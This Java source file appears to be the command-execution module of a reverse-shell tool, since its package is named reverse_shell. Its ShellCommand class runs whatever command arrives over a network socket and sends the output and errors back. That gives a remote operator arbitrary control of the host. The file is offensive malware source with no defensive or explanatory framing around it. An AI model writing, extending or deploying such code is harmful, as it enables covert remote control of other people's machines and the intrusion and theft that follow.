package reverse_shell.modules;

import reverse_shell.CommandHandler;

import java.io.*;
import java.net.Socket;

public class ShellCommand implements CommandHandler {

    @Override
    public void handle(String[] args, Socket socket) throws Exception {
        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);

        // Об'єднуємо аргументи в одну команду
        String command = String.join(" ", args);

        Process process = Runtime.getRuntime().exec(command);
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));

        String line;
        while ((line = reader.readLine()) != null) {
            out.println(line);
        }
        while ((line = errorReader.readLine()) != null) {
            out.println(line);
        }

        process.waitFor();
    }
}
